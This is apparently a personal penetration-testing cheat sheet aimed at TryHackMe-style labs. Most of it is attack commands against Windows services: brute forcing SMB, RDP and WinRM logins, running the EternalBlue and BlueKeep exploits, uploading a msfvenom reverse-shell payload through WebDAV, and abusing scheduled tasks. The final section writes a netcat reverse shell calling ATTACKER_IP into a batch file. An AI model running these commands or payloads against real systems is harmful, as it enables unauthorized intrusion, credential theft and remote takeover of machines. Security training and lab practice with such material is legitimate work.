___
* A cheatsheet that will help with ennumaration and different technics - **Str4ngerX**
* **Tryhackme :** https://tryhackme.com/p/Str4ngerX
* **LinkedIn : **https://www.linkedin.com/in/alaloghmari/
___
# Contents 
___
* ##### [Protocols](#Protocols)
* ##### [Privilege Escalation](#Privilege%20Escalation)
* ##### [Reverse Shell](#Reverse%20Shell)
___
# ⚠️ Important Links : 

>[!warning] Links
>- ##### https://blog.syselement.com/ine/courses/ejpt/ejpt-cheatsheet  (Cheatsheet)

___
# Protocols

- #### **SMB :**

>[!warning] Info
>- Utilizing PsExec (telnet replacement made by microsoft) to gain access to run commands on target.
>- **Download :** https://github.com/fortra/impacket/blob/master/examples/psexec.py

1. **PsExec :** 

```bash
# Before using PsExec we need to gain the credentials via BruteForce.
msfconsole
		-> use auxiliary/scanner/smb/smb_login
		-> set RHOSTS, RPORT, PASS_FILE, USER_FILE
		-> run

# Running a python implementation of the real PsExec.
psexec.py USERNAME@IP_ADRESSE cmd.exe

# Use of Metasploit to execute PsExec.
msfconsole
	-> use exploit/windows/smb/psexec
```

2. **EternalBlue (MS17-010) :**

>[!warning] Infected Versions
>‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ Windows Vista‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ |‎ ‎ ‎ Windows Server 2008
>‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ Windows 7‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ |‎ ‎ ‎ Windows Server 2012
>‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ Windows 8.1‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎‎|‎ ‎ ‎ ‎ Windows Server 2016
>‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ Windows 10
>
>- **Download : ** https://github.com/3ndG4me/AutoBlue-MS17-010.git

```bash
# Check for the vulnerability using Nmap & Msfconsole.
sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 -O TARGET_IP
msfconsole
	-> use auxiliary/scanner/smb/smb_ms17_010

# Manual Exploit (AutoBlue-MS17-010)
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010 && pip install -r requirements.txt # Dependencies.
cd shellcode && chmod +x shell_prep.sh
./shell_prep.sh # Generating the payload.
nc -lnvp LPORT # Setting up a listener.
cd .. && python3 eternalblue_exploit7.py TARGET_IP shellcode/sc_x64.bin

# Automatic Exploit Using Msfconsole.
msfconsole
	-> use exploit/windows/smb/ms17_010_eternalblue
```

- #### **RDP :**

1. **Bruteforce & connect :** 

```bash
# Checking for rdp.
msfconsole
	-> use auxiliary/scanner/rdp/rdp_scanner
	-> set RHOST, RPORT

# Brute forcing credentials.
hydra -L USER_WORDLIST -P PASS_WORDLIST TARGEET_IP -s RPORT RDP

# Connecting to RDP
xfreerdp /u:USERNAME /p:PASSWORD /v:TARGET_IP:RPORT
```

2. **BlueKeep (CVE-2019-0708) :**

>[!warning] Infected Versions
>‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎‎ ‎ ‎ ‎ ‎ ‎ Windows Vista‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ |‎ ‎ ‎ Windows Server 2008 & R2
>‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎‎ Windows XP‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎
>‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎‎ ‎ ‎ ‎‎ ‎ ‎ ‎‎ ‎‎ Windows 7‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎‎
>
>‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎‎ ‎ ‎ ‎ ‎ ‎ ‎‎ ‎ ‎ ‎ ‎ ‎ ‎‎ ‎ ‎ ‎ ‎ ‎ ‎‎ ‎ ‎ ‎‎ ‎ ‎ ‎‎ ‎‎ **Only x64 Versions of Windows**

```bash
# Metasploit Exploitation.
msfconsole
	-> search BlueKeep
	-> use ....
	-> show targets # Choosing a target/windows version : This is mendatory !
	-> set target [number]
	
```

- #### **WinRM :**

```bash
crackmapexec [OPTIONS]
evil-winrm -i IP -u USER -p PASSWORD

nmap --top-ports 7000 TARGET_IP
nmap -sV -p 5985 TARGET_IP
```

```bash
crackmapexec winrm <TARGET_IP> -u <USER> -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

crackmapexec winrm <TARGET_IP> -u <USER> -p <PW> -x "whoami"

crackmapexec winrm <TARGET_IP> -u <USER> -p <PW> -x "systeminfo"
```

```bash
# Command Shell
evil-winrm.rb -u <USER> -p '<PW>' -i <TARGET_IP>
```

2. **Metasploit :** 

```bash
## METASPLOIT

# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

# Brute force creds
use scanner/winrm/winrm_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

# exploit
use exploit/windows/winrm/winrm_script_exec
set USERNAME <USER>
set PASSWORD <PW>
set FORCE_VBS true

# Meterpreter Commands
sysinfo
getuid 
```

# Privilege Escalation

- #### **IIS (Internet Information Services) :**

>[!info]-
>Internet Information Services (IIS) is the default web server on Windows installations

>[!example]- List of IIS Configuration Files
>- **C:\inetpub\wwwroot\web.config**
>- **C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config**

>[!tip]- 
> Quick Way Finding Database Connection Strings :
>```powershell
>type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
>```

```bash
# Exploiting WebDav at /webdav/ : can be uncovered using nmap/gobuster/..
# If credentials (popup) are asked, a bruteforce attack can solve the problem.
hydra -l bob -P ~/Desktop/rockyou.txt 10.10.179.38 http-get /webdav/ -V -I

# Testing what types of files to upload & executed in order to gain a reverse shell.
davtest -auth bob:password -url http://10.10.179.38/webdav/

# Uploading & Executing using cadaver.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=Attacker_IP LPORT=Attacker_PORT -f asp -o shell.asp
cadaver http://10.10.179.38/webdav/ # Will be asked for credentials.
	-> put shell.asp # File can be generated using msfvenom.

# Set up a handler/listener.
msfconsole
	-> use multi/handler
	-> set payload windows/meterpreter/reverse_tcp
	-> show options
```

- #### Scheduled Tasks :

```powershell
# List scheduled tasks.
schtasks

# Retrieve information about any of the services.
schtasks /query /tn vulntask /fo list /v

# Run a scheduled task (if permitted).
schtasks /run /tn vulntask

# Check permissions on an executable.
icacls
```
# Reverse Shell

```powershell
# Writing the command in the file.bat then run it.
# nc64 should be on the victiim machine.
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\file.bat

# On Attacker's Machine.
nc -lvp 4444
```